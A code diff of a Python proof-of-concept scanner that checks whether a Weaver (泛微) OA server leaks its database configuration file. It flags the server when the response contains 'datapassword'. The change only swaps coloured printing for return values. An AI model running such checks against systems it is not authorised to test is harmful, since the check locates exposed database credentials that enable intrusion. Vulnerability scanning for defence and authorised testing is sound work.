@@ -8,8 +8,8 @@ description: mysql_config.ini泄露。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class weaver_oa_db_disclosure_BaseVerify:
     def __init__(self, url):
@@ -25,12 +25,12 @@ class weaver_oa_db_disclosure_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"datapassword" in req.text:
-                cprint("[+]存在泛微OA 数据库配置泄露漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在泛微OA 数据库配置泄露漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = weaver_oa_db_disclosure_BaseVerify(sys.argv[1])
     testVuln.run()
